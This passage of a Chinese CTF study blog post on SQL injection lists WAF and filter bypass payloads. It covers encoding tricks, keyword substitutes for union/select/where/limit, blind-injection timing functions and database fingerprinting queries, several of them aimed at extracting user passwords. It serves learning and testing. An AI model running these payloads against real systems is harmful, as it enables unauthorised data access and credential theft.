<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><ul>
<li><p>大小写绕过</p>
</li>
<li><p>双写绕过（主要用于源码中使用replace替换黑名单）</p>
</li>
<li><p>编码绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>即<span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">31</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-number">31</span>，而Test也可以为<span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>)。<br><br>十六进制编码<br><br><span class="hljs-keyword">SELECT</span>(extractvalue(<span class="hljs-number">0x3C613E61646D696E3C2F613E</span>,<span class="hljs-number">0x2f61</span>))<br><br>双重编码绕过<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a <span class="hljs-operator">/</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,password<span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span>Users<span class="hljs-comment">--+</span><br><br>一些unicode编码举例：    <br>单引号：<span class="hljs-string">&#x27;</span><br><span class="hljs-string">%u0027 %u02b9 %u02bc</span><br><span class="hljs-string">%u02c8 %u2032</span><br><span class="hljs-string">%uff07 %c0%27</span><br><span class="hljs-string">%c0%a7 %e0%80%a7</span><br><span class="hljs-string">空白：</span><br><span class="hljs-string">%u0020 %uff00</span><br><span class="hljs-string">%c0%20 %c0%a0 %e0%80%a0</span><br><span class="hljs-string">左括号(:</span><br><span class="hljs-string">%u0028 %uff08</span><br><span class="hljs-string">%c0%28 %c0%a8</span><br><span class="hljs-string">%e0%80%a8</span><br><span class="hljs-string">右括号):</span><br><span class="hljs-string">%u0029 %uff09</span><br><span class="hljs-string">%c0%29 %c0%a9</span><br><span class="hljs-string">%e0%80%a9</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>like绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">like</span> <span class="hljs-number">1</span>#<br>可绕过对<span class="hljs-operator">=</span> <span class="hljs-operator">&gt;</span>等过滤<br></code></pre></td></tr></table></figure>
</li>
<li><p>in绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;1234&#x27;</span>)#<br></code></pre></td></tr></table></figure>

<blockquote>
<p>in可以代替’&#x3D;’，只有两个字符串一模一样时才返回true，注意括号不能漏，否则报错</p>
</blockquote>
</li>
<li><p>过滤union</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union&#x27;</span><br>绕过方式 <span class="hljs-number">1</span><span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> userid)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>过滤where</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>过滤limit</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> user_id <span class="hljs-keyword">having</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="hljs-number">1</span>的<span class="hljs-keyword">user</span>为admim<br></code></pre></td></tr></table></figure>
</li>
<li><p>过滤group by</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(group_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users ) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>过滤select</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select&#x27;</span><br>只能查询本表中的数据<br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
</blockquote>
</li>
<li><p>过滤’(单引号)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string">绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>过滤hex</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="hljs-operator">|</span>hex<span class="hljs-string">&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="hljs-string">绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>过滤substr</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="hljs-operator">|</span>hex<span class="hljs-operator">|</span>substr<span class="hljs-string">&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span><br><span class="hljs-string">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#x27;</span>r<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>过滤逗号</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>过滤了逗号怎么办？就不能多个参数了吗？<br><span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>);与<span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span> <span class="hljs-keyword">FROM</span> <span class="hljs-number">6</span> <span class="hljs-keyword">FOR</span> <span class="hljs-number">5</span>);<br>意思相同<br>substr支持这样的语法：<br><span class="hljs-built_in">SUBSTRING</span>(str <span class="hljs-keyword">FROM</span> pos <span class="hljs-keyword">FOR</span> len)<br><span class="hljs-built_in">SUBSTRING</span>(str <span class="hljs-keyword">FROM</span> pos)<br>MID()后续加入了这种写法<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii()<br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>benchmark()<br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat()<br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>()<br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>()<br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir()<br> <br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span> pwd <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　<br> <br>或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure>

<h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `version()`  可以用来过空格和正则，特殊情况下还可以当作注释符用<br></code></pre></td></tr></table></figure>

<h1 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h1><h3 id="前端与数据库类型"><a href="#前端与数据库类型" class="headerlink" title="前端与数据库类型"></a>前端与数据库类型</h3><p>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=PostgreSQL&spm=1001.2101.3001.7020">PostgreSQL</a><br>java：Oracle，MySQL</p>
<h2 id="根据特有函数判断"><a href="#根据特有函数判断" class="headerlink" title="根据特有函数判断"></a>根据特有函数判断</h2><h3 id="len和length"><a href="#len和length" class="headerlink" title="len和length"></a>len和length</h3><p><code>len()</code>：SQL Server 、MySQL以及db2返回长度的函数。<br><code>length()</code>：Oracle和INFORMIX返回长度的函数。</p>
<h3 id="version和-version"><a href="#version和-version" class="headerlink" title="version和@@version"></a>version和@@version</h3><p><code>version()</code>：MySQL查询版本信息的函数<br><code>@@version</code>：MySQL和SQL Server查询版本信息的函数</p>
<h3 id="substring和substr"><a href="#substring和substr" class="headerlink" title="substring和substr"></a>substring和substr</h3><p>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
<h3 id="根据特殊符号进行判断"><a href="#根据特殊符号进行判断" class="headerlink" title="根据特殊符号进行判断"></a>根据特殊符号进行判断</h3><p>&#x2F;*是MySQL数据库的注释符<br>–是Oracle和SQL Server支持的注释符<br>;是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br>#是MySQL中的注释符，返回错误则说明可能不是MySQL，另外MySQL也支持– 和&#x2F;**&#x2F;</p>
<h3 id="根据数据库对字符串的处理方式判断"><a href="#根据数据库对字符串的处理方式判断" class="headerlink" title="根据数据库对字符串的处理方式判断"></a>根据数据库对字符串的处理方式判断</h3><p>MySQL<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’+’b’&#x3D;’ab’<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>Oracle<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’||’b’&#x3D;’ab’<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>SQL Server<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’+’b’&#x3D;’ab’ </p>
<h3 id="根据数据库特有的数据表来判断"><a href="#根据数据库特有的数据表来判断" class="headerlink" title="根据数据库特有的数据表来判断"></a>根据数据库特有的数据表来判断</h3><p>MySQL（version&gt;5.0）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from information_schema.TABLES)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>Oracle</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from sys.user_tables)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>SQL Server</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from sysobjects)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h3 id="根据盲注特别函数判断"><a href="#根据盲注特别函数判断" class="headerlink" title="根据盲注特别函数判断"></a>根据盲注特别函数判断</h3><p>MySQL</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">BENCHMARK</span><span class="hljs-params">(<span class="hljs-number">1000000</span>,ENCODE(<span class="hljs-string">&#x27;QWE&#x27;</span>,<span class="hljs-string">&#x27;ASD&#x27;</span>)</span></span>)<br><span class="hljs-function"><span class="hljs-title">SLEEP</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span><br></code></pre></td></tr></table></figure>


<p>PostgreSQL</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PG_SLEEP(<span class="hljs-number">5</span>)<br>GENERATE_SERIES(<span class="hljs-number">1</span>,<span class="hljs-number">1000000</span>)<br></code></pre></td></tr></table></figure>


<p>SQL Server</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WAITFOR</span> DELAY &#x27;<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">5</span>&#x27;<br></code></pre></td></tr></table></figure>

<p>⚠️待补充 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261524.html">珂技系列之一篇就够了——mysql注入 - FreeBuf网络安全行业门户</a></p>
<p>[对MYSQL注入相关内容及部分Trick的归类小结 - 先知社区 (aliyun.com)](</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/mysql/">#mysql</a>
      
        <a href="/tags/web/">#web</a>
      
        <a href="/tags/php/">#php</a>
      
        <a href="/tags/sql/">#sql</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>sql注入学习</div>
      <div>http://sloth31.github.io/2022/01/23/sql注入学习/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Sl0th</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年1月23日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
                <i class="iconfont icon-nc"></i>
              </span>
              </a>
            
              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
                <i class="iconfont icon-sa"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/" title="DTD学习">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">DTD学习</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/" title="php利用math函数rce相关思考与理解">
                        <span class="hidden-mobile">php利用math函数rce相关思考与理解</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  








    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
